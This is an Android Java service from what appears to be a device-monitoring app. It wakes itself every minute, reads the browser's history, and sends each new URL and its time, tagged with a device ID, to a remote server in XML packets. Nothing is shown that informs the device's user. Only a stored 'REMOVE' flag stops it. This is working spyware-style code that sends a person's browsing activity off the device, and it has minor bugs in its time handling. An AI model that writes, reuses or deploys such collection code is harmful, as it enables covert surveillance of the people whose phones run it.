package com.inet.android.history;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import android.annotation.SuppressLint;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.provider.Browser;
import android.util.Log;

import com.inet.android.bs.FileLog;
import com.inet.android.bs.Request;
import com.inet.android.bs.WorkTimeDefiner;

public class LinkService extends Service {

	private static final int SERVICE_REQUEST_CODE = 25; // уникальный int сервиса
	final String LOG_TAG = "historyService";
	SharedPreferences sPref;
	final String SAVED_TIME = "saved_time";
	private Context context;
	private SharedPreferences sp;
	Request req;
	public void onCreate() {
		super.onCreate();
		startService(new Intent(this, LinkService.class));
		
		Log.d(LOG_TAG, "onCreate histroyService");
		FileLog.writeLog("onCreate histroyService");
		
		context = getApplicationContext();
		sp = PreferenceManager.getDefaultSharedPreferences(context);// getPreferences(MODE_PRIVATE);

	}

	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(LOG_TAG, "onStartCommand - " + sp.getString("ID", "ID"));
		FileLog.writeLog(LOG_TAG + " -> onStartCommand - " + sp.getString("ID", "ID"));
		
		sp = PreferenceManager.getDefaultSharedPreferences(this);
		String linkEnd = sp.getString("ACTION", "OK");

		if (linkEnd.equals("REMOVE")) {
			Log.d(LOG_TAG, "REMOVE");
			FileLog.writeLog("historyService -> REMOVE");
			
			return 0;
		}
		
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, 1);// через 1 минут

		PendingIntent servicePendingIntent = PendingIntent.getService(this,
				SERVICE_REQUEST_CODE, new Intent(this, LinkService.class),
				PendingIntent.FLAG_UPDATE_CURRENT);

		AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
				servicePendingIntent);
				
		boolean isWork = WorkTimeDefiner.isDoWork(getApplicationContext());
		if (!isWork) {
			Log.d(LOG_TAG, "isDoWork return " + Boolean.toString(isWork));
			FileLog.writeLog("historyService -> isWork return " + Boolean.toString(isWork));
			
			return Service.START_STICKY;
		} else {
			Log.d(LOG_TAG, "isDoWork return " + Boolean.toString(isWork));
			FileLog.writeLog("historyService -> isDoWork return " + Boolean.toString(isWork));
		}
		
		linkTask(); // просомотр истории браузера
		
		super.onStartCommand(intent, flags, startId);
		return Service.START_STICKY;
	}

	public void onDestroy() {
		super.onDestroy();
		
		Log.d(LOG_TAG, "onDestroy");
		FileLog.writeLog("historyService -> onDestroy");
	}

	public IBinder onBind(Intent intent) {
		Log.d(LOG_TAG, "onBind");
		FileLog.writeLog("historyService -> onBind");
		
		return null;
	}

	@SuppressLint("SimpleDateFormat")
	void linkTask() {

		String[] proj = new String[] { Browser.BookmarkColumns.TITLE,
				Browser.BookmarkColumns.URL, Browser.BookmarkColumns.DATE };
		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 - history,
																// 1 = bookmark
		Cursor mCur = getContentResolver().query(Browser.BOOKMARKS_URI, proj,
				sel, null, null);
		mCur.moveToFirst();
		
		sPref = PreferenceManager.getDefaultSharedPreferences(context);

		String title = "";
		String url = "";

		if (mCur.moveToFirst() && mCur.getCount() > 0) {
			boolean cont = true;
			while (mCur.isAfterLast() == false && cont) {
				title = mCur.getString(mCur
						.getColumnIndex(Browser.BookmarkColumns.DATE));

				Context context = getApplicationContext();
				

				// Create a DateFormatter object for displaying date in
				// specified format.
				DateFormat formatter = new SimpleDateFormat(
						"yyyy-MM-dd HH:mm:ss");

				String savedText = sPref.getString(SAVED_TIME, "");

				// Create a calendar object that will convert the date and time
				// value in milliseconds to date.
				Calendar calendar = Calendar.getInstance();
				calendar.setTimeInMillis(Long.parseLong(savedText));
				formatter.format(calendar.getTime());

				if (Long.parseLong(title) > Long.parseLong(savedText)) {

					Log.d(LOG_TAG, "--- "
							+ formatter.format(calendar.getTime()).toString());
					FileLog.writeLog("historyService -> "
							+ formatter.format(calendar.getTime()).toString());

					// Create a calendar object that will convert the date and
					// time value in milliseconds to date.
					calendar = Calendar.getInstance();
					calendar.setTimeInMillis(Long.parseLong(title));
					formatter.format(calendar.getTime());

					url = mCur.getString(mCur
							.getColumnIndex(Browser.BookmarkColumns.URL));

					String urlDate = formatter.format(calendar.getTime())
							.toString();

					String sendStr = "<packet><id>" + sp.getString("ID", "ID") + "</id><time>" + urlDate
							+ "</time><type>4</type><app>"
							+ "Интернет-браузер</app><url>" + url
							+ "</url><ntime>" + "30"
				+ "</ntime></packet>";
					req = new Request(context);
					req.sendRequest(sendStr);

					Editor ed = sPref.edit();
					ed.putString(SAVED_TIME, title);
					ed.commit();
					
					Log.d(LOG_TAG, formatter.format(calendar.getTime())
							.toString() + " - " + url);
					FileLog.writeLog("historyService ->  "
							+ formatter.format(calendar.getTime()).toString() + " - " + url);
				}
				mCur.moveToNext();

			}
		}

		Editor ed = sPref.edit();
		ed.putString(SAVED_TIME, title);

		ed.commit();
		mCur.close();
	}
}
